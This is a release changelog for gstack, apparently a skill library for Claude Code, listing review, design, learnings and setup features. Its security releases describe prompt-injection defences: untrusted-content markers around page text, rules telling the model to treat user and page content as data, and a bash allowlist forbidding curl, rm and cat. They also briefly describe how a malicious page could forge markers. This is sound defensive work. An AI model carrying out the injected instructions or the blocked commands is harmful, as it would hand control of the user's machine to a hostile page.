- **DX review in /autoplan.** Phase 3.5 runs after Eng review when developer-facing scope is detected. Includes DX-specific dual voices, consensus table, and full 8-dimension scorecard. Triggers on APIs, CLIs, SDKs, shell commands, Claude Code skills, OpenClaw actions, MCP servers, and anything devs implement or debug.
- **"Which review?" comparison table in README.** Quick reference showing which review to use for end users vs developers vs architecture, and when `/autoplan` covers all three.
- **`/plan-devex-review` and `/devex-review` in install instructions.** Both skills now listed in the copy-paste install prompt so new users discover them immediately.

### Changed

- **Autoplan pipeline order.** Now CEO → Design → Eng → DX (was CEO → Design → Eng). DX runs last because it benefits from knowing the architecture.

## [0.15.3.0] - 2026-04-03. Developer Experience Review

You can now review plans for DX quality before writing code. `/plan-devex-review` rates 8 dimensions (getting started, API design, error messages, docs, upgrade path, dev environment, community, measurement) on a 0-10 scale with trend tracking across reviews. After shipping, `/devex-review` uses the browse tool to actually test the live experience and compare against plan-stage scores.

### Added

- **/plan-devex-review skill.** Plan-stage DX review based on Addy Osmani's framework. Auto-detects product type (API, CLI, SDK, library, platform, docs, Claude Code skill). Includes developer empathy simulation, DX scorecard with trends, and a conditional Claude Code Skill DX checklist for reviewing skills themselves.
- **/devex-review skill.** Live DX audit using the browse tool. Tests docs, getting started flows, error messages, and CLI help. Each dimension scored as TESTED, INFERRED, or N/A with screenshot evidence. Boomerang comparison: plan said TTHW would be 3 minutes, reality says 8.
- **DX Hall of Fame reference.** On-demand examples from Stripe, Vercel, Elm, Rust, htmx, Tailwind, and more, loaded per review pass to avoid prompt bloat.
- **`{{DX_FRAMEWORK}}` resolver.** Shared DX principles, characteristics, and scoring rubric for both skills. Compact (~150 lines) so it doesn't eat context.
- **DX Review in the dashboard.** Both skills write to the review log and show up in the Review Readiness Dashboard alongside CEO, Eng, and Design reviews.

## [0.15.2.1] - 2026-04-02. Setup Runs Migrations

`git pull && ./setup` now applies version migrations automatically. Previously, migrations only ran during `/gstack-upgrade`, so users who updated via git pull never got state fixes (like the skill directory restructure from v0.15.1.0). Now `./setup` tracks the last version it ran at and applies any pending migrations on every run.

### Fixed

- **Setup runs pending migrations.** `./setup` now checks `~/.gstack/.last-setup-version` and runs any migration scripts newer than that version. No more broken skill directories after `git pull`.
- **Space-safe migration loop.** Uses `while read` instead of `for` loop to handle paths with spaces correctly.
- **Fresh installs skip migrations.** New installs write the version marker without running historical migrations that don't apply to them.
- **Future migration guard.** Migrations for versions newer than the current VERSION are skipped, preventing premature execution from development branches.
- **Missing VERSION guard.** If the VERSION file is absent, the version marker isn't written, preventing permanent migration poisoning.

## [0.15.2.0] - 2026-04-02. Voice-Friendly Skill Triggers

Say "run a security check" instead of remembering `/cso`. Skills now have voice-friendly trigger phrases that work with AquaVoice, Whisper, and other speech-to-text tools. No more fighting with acronyms that get transcribed wrong ("CSO" -> "CEO" -> wrong skill).

### Added

- **Voice triggers for 10 skills.** Each skill gets natural-language aliases baked into its description. "see-so", "security review", "tech review", "code x", "speed test" and more. The right skill activates even when speech-to-text mangles the command name.
- **`voice-triggers:` YAML field in templates.** Structured authoring: add aliases to any `.tmpl` frontmatter, `gen-skill-docs` folds them into the description during generation. Clean source, clean output.
- **Voice input section in README.** New users know skills work with voice from day one.
- **`voice-triggers` documented in CONTRIBUTING.md.** Frontmatter contract updated so contributors know the field exists.

## [0.15.1.0] - 2026-04-01. Design Without Shotgun

You can now run `/design-html` without having to run `/design-shotgun` first. The skill detects what design context exists (CEO plans, design review artifacts, approved mockups) and asks how you want to proceed. Start from a plan, a description, or a provided PNG, not just an approved mockup.

### Changed

- **`/design-html` works from any starting point.** Three routing modes: (A) approved mockup from /design-shotgun, (B) CEO plan and/or design variants without formal approval, (C) clean slate with just a description. Each mode asks the right questions and proceeds accordingly.
- **AskUserQuestion for missing context.** Instead of blocking with "no approved design found," the skill now offers choices: run the planning skills first, provide a PNG, or just describe what you want and design live.

### Fixed

- **Skills now discovered as top-level names.** Setup creates real directories with SKILL.md symlinks inside instead of directory symlinks. This fixes Claude auto-prefixing skill names with `gstack-` when using `--no-prefix` mode. `/qa` is now just `/qa`, not `/gstack-qa`.

## [0.15.0.0] - 2026-04-01. Session Intelligence

Your AI sessions now remember what happened. Plans, reviews, checkpoints, and health scores survive context compaction and compound across sessions. Every skill writes a timeline event, and the preamble reads recent artifacts on startup so the agent knows where you left off.

### Added

- **Session timeline.** Every skill auto-logs start/complete events to `timeline.jsonl`. Local-only, never sent anywhere, always on regardless of telemetry setting. /retro can now show "this week: 3 /review, 2 /ship across 3 branches."
- **Context recovery.** After compaction or session start, the preamble lists your recent CEO plans, checkpoints, and reviews. The agent reads the most recent one to recover decisions and progress without asking you to repeat yourself.
- **Cross-session injection.** On session start, the preamble prints your last skill run on this branch and your latest checkpoint. You see "Last session: /review (success)" before typing anything.
- **Predictive skill suggestion.** If your last 3 sessions on a branch follow a pattern (review, ship, review), gstack suggests what you probably want next.
- **Welcome back message.** Sessions synthesize a one-paragraph briefing: branch name, last skill, checkpoint status, health score.
- **`/checkpoint` skill.** Save and resume working state snapshots. Captures git state, decisions made, remaining work. Supports cross-branch listing for Conductor workspace handoff between agents.
- **`/health` skill.** Code quality scorekeeper. Wraps your project's tools (tsc, biome, knip, shellcheck, tests), computes a composite 0-10 score, tracks trends over time. When the score drops, it tells you exactly what changed and where to fix it.
- **Timeline binaries.** `bin/gstack-timeline-log` and `bin/gstack-timeline-read` for append-only JSONL timeline storage.
- **Routing rules.** /checkpoint and /health added to the skill routing injection.

## [0.14.6.0] - 2026-03-31. Recursive Self-Improvement

gstack now learns from its own mistakes. Every skill session captures operational failures (CLI errors, wrong approaches, project quirks) and surfaces them in future sessions. No setup needed, just works.

### Added

- **Operational self-improvement.** When a command fails or you hit a project-specific gotcha, gstack logs it. Next session, it remembers. "bun test needs --timeout 30000" or "login flow requires cookie import first" ... the kind of stuff that wastes 10 minutes every time you forget it.
- **Learnings summary in preamble.** When your project has 5+ learnings, gstack shows the top 3 at the start of every session so you see them before you start working.
- **13 skills now learn.** office-hours, plan-ceo-review, plan-eng-review, plan-design-review, design-review, design-consultation, cso, qa, qa-only, and retro all now read prior learnings AND contribute new ones. Previously only review, ship, and investigate were wired.

### Changed

- **Contributor mode replaced.** The old contributor mode (manual opt-in, markdown reports to ~/.gstack/contributor-logs/) never fired in 18 days of heavy use. Replaced with automatic operational learning that captures the same insights without any setup.

### Fixed

- **learnings-show E2E test slug mismatch.** The test seeded learnings at a hardcoded path but gstack-slug computed a different path at runtime. Now computes the slug dynamically.

## [0.14.5.0] - 2026-03-31. Ship Idempotency + Skill Prefix Fix

Re-running `/ship` after a failed push or PR creation no longer double-bumps your version or duplicates your CHANGELOG. And if you use `--prefix` mode, your skill names actually work now.

### Fixed

- **`/ship` is now idempotent (#649).** If push succeeds but PR creation fails (API outage, rate limit), re-running `/ship` detects the already-bumped VERSION, skips the push if already up to date, and updates the existing PR body instead of creating a duplicate. The CHANGELOG step was already idempotent by design ("replace with unified entry"), so no guard needed there.
- **Skill prefix actually patches `name:` in SKILL.md (#620, #578).** `./setup --prefix` and `gstack-relink` now patch the `name:` field in each skill's SKILL.md frontmatter to match the prefix setting. Previously, symlinks were prefixed but Claude Code read the unprefixed `name:` field and ignored the prefix entirely. Edge cases handled: `gstack-upgrade` not double-prefixed, root `gstack` skill never prefixed, prefix removal restores original names.
- **`gen-skill-docs` warns when prefix patches need re-applying.** After regenerating SKILL.md files, if `skill_prefix: true` is set in config, a warning reminds you to run `gstack-relink`.
- **PR idempotency checks open state.** The PR guard now verifies the existing PR is `OPEN`, so closed PRs don't block new PR creation.
- **`--no-prefix` ordering bug.** `gstack-patch-names` now runs before `link_claude_skill_dirs` so symlink names reflect the correct patched values.

### Added

- **`bin/gstack-patch-names` shared helper.** DRY extraction of the name-patching logic used by both `setup` and `gstack-relink`. Handles all edge cases (no frontmatter, already-prefixed, inherently-prefixed dirs) with portable `mktemp + mv` sed.

### For contributors

- 4 unit tests for name: patching in `relink.test.ts`
- 2 tests for gen-skill-docs prefix warning
- 1 E2E test for ship idempotency (periodic tier)
- Updated `setupMockInstall` to write SKILL.md with proper frontmatter

## [0.14.4.0] - 2026-03-31. Review Army: Parallel Specialist Reviewers

Every `/review` now dispatches specialist subagents in parallel. Instead of one agent applying one giant checklist, you get focused reviewers for testing gaps, maintainability, security, performance, data migrations, API contracts, and adversarial red-teaming. Each specialist reads the diff independently with fresh context, outputs structured JSON findings, and the main agent merges, deduplicates, and boosts confidence when multiple specialists flag the same issue. Small diffs (<50 lines) skip specialists entirely for speed. Large diffs (200+ lines) activate the Red Team for adversarial analysis on top.

### Added

- **7 specialist reviewers** running in parallel via Agent tool subagents. Always-on: Testing + Maintainability. Conditional: Security (auth scope), Performance (backend/frontend), Data Migration (migration files), API Contract (controllers/routes), Red Team (large diffs or critical findings).
- **JSON finding schema.** Specialists output structured JSON objects with severity, confidence, path, line, category, fix, and fingerprint fields. Reliable parsing, no more pipe-delimited text.
- **Fingerprint-based dedup.** When two specialists flag the same file:line:category, the finding gets boosted confidence and a "MULTI-SPECIALIST CONFIRMED" marker.
- **PR Quality Score.** Every review computes a 0-10 quality score: `10 - (critical * 2 + informational * 0.5)`. Logged to review history for trending via `/retro`.
- **3 new diff-scope signals.** `gstack-diff-scope` now detects SCOPE_MIGRATIONS, SCOPE_API, and SCOPE_AUTH to activate the right specialists.
- **Learning-informed specialist prompts.** Each specialist gets past learnings for its domain injected into the prompt, so reviews get smarter over time.
- **14 new diff-scope tests** covering all 9 scope signals including the 3 new ones.
- **7 new E2E tests** (5 gate, 2 periodic) covering migration safety, N+1 detection, delivery audit, quality score, JSON schema compliance, red team activation, and multi-specialist consensus.

### Changed

- **Review checklist refactored.** Categories now covered by specialists (test gaps, dead code, magic numbers, performance, crypto) removed from the main checklist. Main agent focuses on CRITICAL pass only.
- **Delivery Integrity enhanced.** The existing plan completion audit now investigates WHY items are missing (not just that they're missing) and logs plan-file discrepancies as learnings. Commit-message inference is informational only, never persisted.

## [0.14.3.0] - 2026-03-31. Always-On Adversarial Review + Scope Drift + Plan Mode Design Tools

Every code review now runs adversarial analysis from both Claude and Codex, regardless of diff size. A 5-line auth change gets the same cross-model scrutiny as a 500-line feature. The old "skip adversarial for small diffs" heuristic is gone... diff size was never a good proxy for risk.

### Added

- **Always-on adversarial review.** Every `/review` and `/ship` run now dispatches both a Claude adversarial subagent and a Codex adversarial challenge. No more tier-based skipping. The Codex structured review (formal P1 pass/fail gate) still runs on large diffs (200+ lines) where the formal gate adds value.
- **Scope drift detection in `/ship`.** Before shipping, `/ship` now checks whether you built what you said you'd build, nothing more, nothing less. Catches scope creep ("while I was in there..." changes) and missing requirements. Results appear in the PR body.
- **Plan Mode Safe Operations.** Browse screenshots, design mockups, Codex outside voices, and writing to `~/.gstack/` are now explicitly allowed in plan mode. Design-related skills (`/design-consultation`, `/design-shotgun`, `/design-html`, `/plan-design-review`) can generate visual artifacts during planning without fighting plan mode restrictions.

### Changed

- **Adversarial opt-out split.** The legacy `codex_reviews=disabled` config now only gates Codex passes. Claude adversarial subagent always runs since it's free and fast. Previously the kill switch disabled everything.
- **Cross-model tension format.** Outside voice disagreements now include `RECOMMENDATION` and `Completeness` scores, matching the standard AskUserQuestion format used everywhere else in gstack.
- **Scope drift is now a shared resolver.** Extracted from `/review` into `generateScopeDrift()` so both `/review` and `/ship` use the same logic. DRY.

## [0.14.2.0] - 2026-03-30. Sidebar CSS Inspector + Per-Tab Agents

The sidebar is now a visual design tool. Pick any element on the page and see the full CSS rule cascade, box model, and computed styles right in the Side Panel. Edit styles live and see changes instantly. Each browser tab gets its own independent agent, so you can work on multiple pages simultaneously without cross-talk. Cleanup is LLM-powered... the agent snapshots the page, understands it semantically, and removes the junk while keeping the site's identity.

### Added

- **CSS Inspector in the sidebar.** Click "Pick Element", hover over anything, click it, and the sidebar shows the full CSS rule cascade with specificity badges, source file:line, box model visualization (gstack palette colors), and computed styles. Like Chrome DevTools, but inside the sidebar.
- **Live style editing.** `$B style .selector property value` modifies CSS rules in real time via CDP. Changes show instantly on the page. Undo with `$B style --undo`.
- **Per-tab agents.** Each browser tab gets its own Claude agent process via `BROWSE_TAB` env var. Switch tabs in the browser and the sidebar swaps to that tab's chat history. Ask questions about different pages in parallel without agents fighting over which tab is active.
- **Tab tracking.** User-created tabs (Cmd+T, right-click "Open in new tab") are automatically tracked via `context.on('page')`. The sidebar tab bar updates in real time. Click a tab in the sidebar to switch the browser. Close a tab and it disappears.
- **LLM-powered page cleanup.** The cleanup button sends a prompt to the sidebar agent (which IS an LLM). The agent runs a deterministic first pass, snapshots the page, analyzes what's left, and removes clutter intelligently while preserving site branding. Works on any site without brittle CSS selectors.
- **Pretty screenshots.** `$B prettyscreenshot --cleanup --scroll-to ".pricing" ~/Desktop/hero.png` combines cleanup, scroll positioning, and screenshot in one command.
- **Stop button.** A red stop button appears in the sidebar when an agent is working. Click it to cancel the current task.
- **CSP fallback for inspector.** Sites with strict Content Security Policy (like SF Chronicle) now get a basic picker via the always-loaded content script. You see computed styles, box model, and same-origin CSS rules. Full CDP mode on sites that allow it.
- **Cleanup + Screenshot buttons in chat toolbar.** Not hidden in debug... right there in the chat. Disabled when disconnected so you don't get error spam.

### Fixed

- **Inspector message allowlist.** The background.js allowlist was missing all inspector message types, silently rejecting them. The inspector was broken for all pages, not just CSP-restricted ones. (Found by Codex review.)
- **Sticky nav preservation.** Cleanup no longer removes the site's top nav bar. Sorts sticky elements by position and preserves the first full-width element near the top.
- **Agent won't stop.** System prompt now tells the agent to be concise and stop when done. No more endless screenshot-and-highlight loops.
- **Focus stealing.** Agent commands no longer pull Chrome to the foreground. Internal tab pinning uses `bringToFront: false`.
- **Chat message dedup.** Old messages from previous sessions no longer repeat on reconnect.

### Changed

- **Sidebar banner** now says "Browser co-pilot" instead of the old mode-specific text.
- **Input placeholder** is "Ask about this page..." (more inviting than the old placeholder).
- **System prompt** includes prompt injection defense and allowed-commands whitelist from the security audit.

## [0.14.1.0] - 2026-03-30. Comparison Board is the Chooser

The design comparison board now always opens automatically when reviewing variants. No more inline image + "which do you prefer?". the board has rating controls, comments, remix/regenerate buttons, and structured feedback output. That's the experience. All 3 design skills (/plan-design-review, /design-shotgun, /design-consultation) get this fix.

### Changed

- **Comparison board is now mandatory.** After generating design variants, the agent creates a comparison board with `$D compare --serve` and sends you the URL via AskUserQuestion. You interact with the board, click Submit, and the agent reads your structured feedback from `feedback.json`. No more polling loops as the primary wait mechanism.
- **AskUserQuestion is the wait, not the chooser.** The agent uses AskUserQuestion to tell you the board is open and wait for you to finish, not to present variants inline and ask for preferences. The board URL is always included so you can click through if you lost the tab.
- **Serve-failure fallback improved.** If the comparison board server can't start, variants are shown inline via Read tool before asking for preferences. you're no longer choosing blind.

### Fixed

- **Board URL corrected.** The recovery URL now points to `http://127.0.0.1:<PORT>/` (where the server actually serves) instead of `/design-board.html` (which would 404).

## [0.14.0.0] - 2026-03-30. Design to Code

You can now go from an approved design mockup to production-quality HTML with one command. `/design-html` takes the winning design from `/design-shotgun` and generates Pretext-native HTML where text actually reflows on resize, heights adjust to content, and layouts are dynamic. No more hardcoded CSS heights or broken text overflow.

### Added

- **`/design-html` skill.** Takes an approved mockup from `/design-shotgun` and generates self-contained HTML with Pretext for computed text layout. Smart API routing picks the right Pretext patterns for each design type (simple layouts, card grids, chat bubbles, editorial spreads). Includes a refinement loop where you preview in browser, give feedback, and iterate until it's right.
- **Pretext vendored.** 30KB Pretext source bundled in `design-html/vendor/pretext.js` for offline, zero-dependency HTML output. Framework output (React/Svelte/Vue) uses npm install instead.
- **Design pipeline chaining.** `/design-shotgun` Step 6 now offers `/design-html` as the next step. `/design-consultation` suggests it after producing screen-level designs. `/plan-design-review` chains to both `/design-shotgun` and `/design-html` alongside review skills.

### Changed

- **`/plan-design-review` next steps expanded.** Previously only chained to other review skills. Now also offers `/design-shotgun` (explore variants) and `/design-html` (generate HTML from approved mockups).

## [0.13.10.0] - 2026-03-29. Office Hours Gets a Reading List

Repeat /office-hours users now get fresh, curated resources every session instead of the same YC closing. 34 hand-picked videos and essays from Garry Tan, Lightcone Podcast, YC Startup School, and Paul Graham, contextually matched to what came up during the session. The system remembers what it already showed you, so you never see the same recommendation twice.

### Added

- **Rotating founder resources in /office-hours closing.** 34 curated resources across 5 categories (Garry Tan videos, YC Backstory, Lightcone Podcast, YC Startup School, Paul Graham essays). Claude picks 2-3 per session based on session context, not randomly.
- **Resource dedup log.** Tracks which resources were shown in `~/.gstack/projects/$SLUG/resources-shown.jsonl` so repeat users always see fresh content.
- **Resource selection analytics.** Logs which resources get picked to `skill-usage.jsonl` so you can see patterns over time.
- **Browser-open offer.** After showing resources, offers to open them in your browser so you can check them out later.

### Fixed

- **Build script chmod safety net.** `bun build --compile` output now gets `chmod +x` explicitly, preventing "permission denied" errors when binaries lose execute permission during workspace cloning or file transfer.

## [0.13.9.0] - 2026-03-29. Composable Skills

Skills can now load other skills inline. Write `{{INVOKE_SKILL:office-hours}}` in a template and the generator emits the right "read file, skip preamble, follow instructions" prose automatically. Handles host-aware paths and customizable skip lists.

### Added

- **`{{INVOKE_SKILL:skill-name}}` resolver.** Composable skill loading as a first-class resolver. Emits host-aware prose that tells Claude or Codex to read another skill's SKILL.md and follow it inline, skipping preamble sections. Supports optional `skip=` parameter for additional sections to skip.
- **Parameterized resolver support.** The placeholder regex now handles `{{NAME:arg1:arg2}}`, enabling resolvers that take arguments at generation time. Fully backward compatible with existing `{{NAME}}` patterns.
- **`{{CHANGELOG_WORKFLOW}}` resolver.** Changelog generation logic extracted from /ship into a reusable resolver. Includes voice guidance ("lead with what the user can now do") inline.
- **Frontmatter `name:` for skill registration.** Setup script and gen-skill-docs now read `name:` from SKILL.md frontmatter for symlink naming. Enables directory names that differ from invocation names (e.g., `run-tests/` directory registered as `/test`).
- **Proactive skill routing.** Skills now ask once to add routing rules to your project's CLAUDE.md. This makes Claude invoke the right skill automatically instead of answering directly. Your choice is remembered in `~/.gstack/config.yaml`.
- **Annotated config file.** `~/.gstack/config.yaml` now gets a documented header on first creation explaining every setting. Edit it anytime.

### Changed

- **BENEFITS_FROM now delegates to INVOKE_SKILL.** Eliminated duplicated skip-list logic. The prerequisite offer wrapper stays in BENEFITS_FROM, but the actual "read and follow" instructions come from INVOKE_SKILL.
- **/plan-ceo-review mid-session fallback uses INVOKE_SKILL.** The "user can't articulate the problem, offer /office-hours" path now uses the composable resolver instead of inline prose.
- **Stronger routing language.** office-hours, investigate, and ship descriptions now say "Proactively invoke" instead of "Proactively suggest" for more reliable automatic skill invocation.

### Fixed

- **Config grep anchored to line start.** Commented header lines no longer shadow real config values.

## [0.13.8.0] - 2026-03-29. Security Audit Round 2

Browse output is now wrapped in trust boundary markers so agents can tell page content from tool output. Markers are escape-proof. The Chrome extension validates message senders. CDP binds to localhost only. Bun installs use checksum verification.

### Fixed

- **Trust boundary markers are escape-proof.** URLs sanitized (no newlines), marker strings escaped in content. A malicious page can't forge the END marker to break out of the untrusted block.

### Added

- **Content trust boundary markers.** Every browse command that returns page content (`text`, `html`, `links`, `forms`, `accessibility`, `console`, `dialog`, `snapshot`, `diff`, `resume`, `watch stop`) wraps output in `--- BEGIN/END UNTRUSTED EXTERNAL CONTENT ---` markers. Agents know what's page content vs tool output.
- **Extension sender validation.** Chrome extension rejects messages from unknown senders and enforces a message type allowlist. Prevents cross-extension message spoofing.
- **CDP localhost-only binding.** `bin/chrome-cdp` now passes `--remote-debugging-address=127.0.0.1` and `--remote-allow-origins` to prevent remote debugging exposure.
- **Checksum-verified bun install.** The browse SKILL.md bootstrap now downloads the bun install script to a temp file and verifies SHA-256 before executing. No more piping curl to bash.

### Removed

- **Factory Droid support.** Removed `--host factory`, `.factory/` generated skills, Factory CI checks, and all Factory-specific code paths.

## [0.13.7.0] - 2026-03-29. Community Wave

Six community fixes with 16 new tests. Telemetry off now means off everywhere. Skills are findable by name. And changing your prefix setting actually works now.

### Fixed

- **Telemetry off means off everywhere.** When you set telemetry to off, gstack no longer writes local JSONL analytics files. Previously "off" only stopped remote reporting. Now nothing is written anywhere. Clean trust contract.
- **`find -delete` replaced with POSIX `-exec rm`.** Safety Net and other non-GNU environments no longer choke on session cleanup.
- **No more preemptive context warnings.** `/plan-eng-review` no longer warns you about running low on context. The system handles compaction automatically.
- **Sidebar security test updated** for Write tool fallback string change.
- **`gstack-relink` no longer double-prefixes `gstack-upgrade`.** Setting `skill_prefix=true` was creating `gstack-gstack-upgrade` instead of keeping the existing name. Now matches `setup` script behavior.

### Added

- **Skill discoverability.** Every skill description now contains "(gstack)" so you can find gstack skills by searching in Claude Code's command palette.
- **Feature signal detection in `/ship`.** Version bump now checks for new routes, migrations, test+source pairs, and `feat/` branches. Catches MINOR-worthy changes that line count alone misses.
- **Sidebar Write tool.** Both the sidebar agent and headed-mode server now include Write in allowedTools. Write doesn't expand the attack surface beyond what Bash already provides.
- **Sidebar stderr capture.** The sidebar agent now buffers stderr and includes it in error and timeout messages instead of silently discarding it.
- **`bin/gstack-relink`** re-creates skill symlinks when you change `skill_prefix` via `gstack-config set`. No more manual `./setup` re-run needed.
- **`bin/gstack-open-url`** cross-platform URL opener (macOS: `open`, Linux: `xdg-open`, Windows: `start`).

## [0.13.6.0] - 2026-03-29. GStack Learns

Every session now makes the next one smarter. gstack remembers patterns, pitfalls, and preferences across sessions and uses them to improve every review, plan, debug, and ship. The more you use it, the better it gets on your codebase.

### Added

- **Project learnings system.** gstack automatically captures patterns and pitfalls it discovers during /review, /ship, /investigate, and other skills. Stored per-project at `~/.gstack/projects/{slug}/learnings.jsonl`. Append-only, Supabase-compatible schema.
- **`/learn` skill.** Review what gstack has learned (`/learn`), search (`/learn search auth`), prune stale entries (`/learn prune`), export to markdown (`/learn export`), or check stats (`/learn stats`). Manually add learnings with `/learn add`.
- **Confidence calibration.** Every review finding now includes a confidence score (1-10). High-confidence findings (7+) show normally, medium (5-6) show with a caveat, low (<5) are suppressed. No more crying wolf.
- **"Learning applied" callouts.** When a review finding matches a past learning, gstack displays it: "Prior learning applied: [pattern] (confidence 8/10, from 2026-03-15)". You can see the compounding in action.
- **Cross-project discovery.** gstack can search learnings from your other projects for matching patterns. Opt-in, with a one-time AskUserQuestion for consent. Stays local to your machine.
- **Confidence decay.** Observed and inferred learnings lose 1 confidence point per 30 days. User-stated preferences never decay. A good pattern is a good pattern forever, but uncertain observations fade.
- **Learnings count in preamble.** Every skill now shows "LEARNINGS: N entries loaded" during startup.
- **5-release roadmap design doc.** `docs/designs/SELF_LEARNING_V0.md` maps the path from R1 (GStack Learns) through R4 (/autoship, one-command full feature) to R5 (Studio).

## [0.13.5.1] - 2026-03-29. Gitignore .factory

### Changed

- **Stop tracking `.factory/` directory.** Generated Factory Droid skill files are now gitignored, same as `.claude/skills/` and `.agents/`. Removes 29 generated SKILL.md files from the repo. The `setup` script and `bun run build` regenerate these on demand.

## [0.13.5.0] - 2026-03-29. Factory Droid Compatibility

gstack now works with Factory Droid. Type `/qa` in Droid and get the same 29 skills you use in Claude Code. This makes gstack the first skill library that works across Claude Code, Codex, and Factory Droid.

### Added

- **Factory Droid support (`--host factory`).** Generate Factory-native skills with `bun run gen:skill-docs --host factory`. Skills install to `.factory/skills/` with proper frontmatter (`user-invocable: true`, `disable-model-invocation: true` for sensitive skills like /ship and /land-and-deploy).
- **`--host all` flag.** One command generates skills for all 3 hosts. Fault-tolerant: catches per-host errors, only fails if Claude generation fails.
- **`gstack-platform-detect` binary.** Prints a table of installed AI coding agents with versions, skill paths, and gstack status. Useful for debugging multi-host setups.
- **Sensitive skill safety.** Six skills with side effects (ship, land-and-deploy, guard, careful, freeze, unfreeze) now declare `sensitive: true` in their templates. Factory Droids won't auto-invoke them. Claude and Codex output strips the field.
- **Factory CI freshness check.** The skill-docs workflow now verifies Factory output is fresh on every PR.
- **Factory awareness across operational tooling.** skill-check dashboard, gstack-uninstall, and setup script all know about Factory.

### Changed

- **Refactored multi-host generation.** Extracted `processExternalHost()` shared helper from the Codex-specific code block. Both Codex and Factory use the same function for output routing, symlink loop detection, frontmatter transformation, and path rewrites. Codex output is byte-identical after refactor.
- **Build script uses `--host all`.** Replaces chained `gen:skill-docs` calls with a single `--host all` invocation.
- **Tool name translation for Factory.** Claude Code tool names ("use the Bash tool") are translated to generic phrasing ("run this command") in Factory output, matching Factory's tool naming conventions.

## [0.13.4.0] - 2026-03-29. Sidebar Defense

The Chrome sidebar now defends against prompt injection attacks. Three layers: XML-framed prompts with trust boundaries, a command allowlist that restricts bash to browse commands only, and Opus as the default model (harder to manipulate).

### Fixed

- **Sidebar agent now respects server-side args.** The sidebar-agent process was silently rebuilding its own Claude args from scratch, ignoring `--model`, `--allowedTools`, and other flags set by the server. Every server-side configuration change was silently dropped. Now uses the queued args.

### Added

- **XML prompt framing with trust boundaries.** User messages are wrapped in `<user-message>` tags with explicit instructions to treat content as data, not instructions. XML special characters (`< > &`) are escaped to prevent tag injection attacks.
- **Bash command allowlist.** The sidebar's system prompt now restricts Claude to browse binary commands only (`$B goto`, `$B click`, `$B snapshot`, etc.). All other bash commands (`curl`, `rm`, `cat`, etc.) are forbidden. This prevents prompt injection from escalating to arbitrary code execution.
- **Opus default for sidebar.** The sidebar now uses Opus (the most injection-resistant model) by default, instead of whatever model Claude Code happens to be running.
- **ML prompt injection defense design doc.** Full design doc at `docs/designs/ML_PROMPT_INJECTION_KILLER.md` covering the follow-up ML classifier (DeBERTa, BrowseSafe-bench, Bun-native 5ms vision). P0 TODO for the next PR.

## [0.13.3.0] - 2026-03-28. Lock It Down

Six fixes from community PRs and bug reports. The big one: your dependency tree is now pinned. Every `bun install` resolves the exact same versions, every time. No more floating ranges pulling fresh packages from npm on every setup.

### Fixed

- **Dependencies are now pinned.** `bun.lock` is committed and tracked. Every install resolves identical versions instead of floating `^` ranges from npm. Closes the supply-chain vector from #566.
- **`gstack-slug` no longer crashes outside git repos.** Falls back to directory name and "unknown" branch when there's no remote or HEAD. Every review skill that depends on slug detection now works in non-git contexts.
- **`./setup` no longer hangs in CI.** The skill-prefix prompt now auto-selects short names after 10 seconds. Conductor workspaces, Docker builds, and unattended installs proceed without human input.
- **Browse CLI works on Windows.** The server lockfile now uses `'wx'` string flag instead of numeric `fs.constants` that Bun compiled binaries don't handle on Windows.
- **`/ship` and `/review` find your design docs.** Plan search now checks `~/.gstack/projects/` first, where `/office-hours` writes design documents. Previously, plan validation silently skipped because it was looking in the wrong directories.
- **`/autoplan` dual-voice actually works.** Background subagents can't read files (Claude Code limitation), so the Claude voice was silently failing on every run. Now runs sequentially in foreground. Both voices complete before the consensus table.

### Added

- **Community PR guardrails in CLAUDE.md.** ETHOS.md, promotional material, and Garry's voice are explicitly protected from modification without user approval.

## [0.13.2.0] - 2026-03-28. User Sovereignty

AI models now recommend instead of override. When Claude and Codex agree on a scope change, they present it to you instead of just doing it. Your direction is the default, not the models' consensus.

### Added

- **User Sovereignty principle in ETHOS.md.** The third core principle: AI models recommend, users decide. Cross-model agreement is a strong signal, not a mandate.
- **User Challenge category in /autoplan.** When both models agree your stated direction should change, it goes to the final approval gate as a "User Challenge" instead of being auto-decided. Your original direction stands unless you explicitly change it.
- **Security/feasibility warning framing.** If both models flag something as a security risk (not just a preference), the question explicitly warns you it's a safety concern, not a taste call.
- **Outside Voice Integration Rule in CEO and Eng reviews.** Outside voice findings are informational until you explicitly approve each one.
- **User sovereignty statement in all skill voices.** Every skill now includes the rule that cross-model agreement is a recommendation, not a decision.

### Changed

- **Cross-model tension template no longer says "your assessment of who's right."** Now says "present both perspectives neutrally, state what context you might be missing." Options expanded from Add/Skip to Accept/Keep/Investigate/Defer.
- **/autoplan now has two gates, not one.** Premises (Phase 1) and User Challenges (both models disagree with your direction). Important Rules updated from "premises are the one gate" to "two gates."
- **Decision Audit Trail now tracks classification.** Each auto-decision is logged as mechanical, taste, or user-challenge.

## [0.13.1.0] - 2026-03-28. Defense in Depth

The browse server runs on localhost and requires a token for access, so these issues only matter if a malicious process is already running on your machine (e.g., a compromised npm postinstall script). This release hardens the attack surface so that even in that scenario, the damage is contained.

### Fixed

- **Auth token removed from `/health` endpoint.** Token now distributed via `.auth.json` file (0o600 permissions) instead of an unauthenticated HTTP response.
- **Cookie picker data routes now require Bearer auth.** The HTML picker page is still open (it's the UI shell), but all data and action endpoints check the token.
- **CORS tightened on `/refs` and `/activity/*`.** Removed wildcard origin header so websites can't read browse activity cross-origin.
- **State files auto-expire after 7 days.** Cookie state files now include a timestamp and warn on load if stale. Server startup cleans up files older than 7 days.
- **Extension uses `textContent` instead of `innerHTML`.** Prevents DOM injection if server-provided data ever contained markup. Standard defense-in-depth for browser extensions.
- **Path validation resolves symlinks before boundary checks.** `validateReadPath` now calls `realpathSync` and handles macOS `/tmp` symlink correctly.
- **Freeze hook uses portable path resolution.** POSIX-compatible (works on macOS without coreutils), fixes edge case where `/project-evil` could match a freeze boundary set to `/project`.
- **Shell config scripts validate input.** `gstack-config` rejects regex-special keys and escapes sed patterns. `gstack-telemetry-log` sanitizes branch/repo names in JSON output.

### Added

- 20 regression tests covering all hardening changes.

## [0.13.0.0] - 2026-03-27. Your Agent Can Design Now

gstack can generate real UI mockups. Not ASCII art, not text descriptions of hex codes, real visual designs you can look at, compare, pick from, and iterate on. Run `/office-hours` on a UI idea and you'll get 3 visual concepts in Chrome with a comparison board where you pick your favorite, rate the others, and tell the agent what to change.

### Added

- **Design binary** (`$D`). New compiled CLI wrapping OpenAI's GPT Image API. 13 commands: `generate`, `variants`, `iterate`, `check`, `compare`, `extract`, `diff`, `verify`, `evolve`, `prompt`, `serve`, `gallery`, `setup`. Generates pixel-perfect UI mockups from structured design briefs in ~40 seconds.
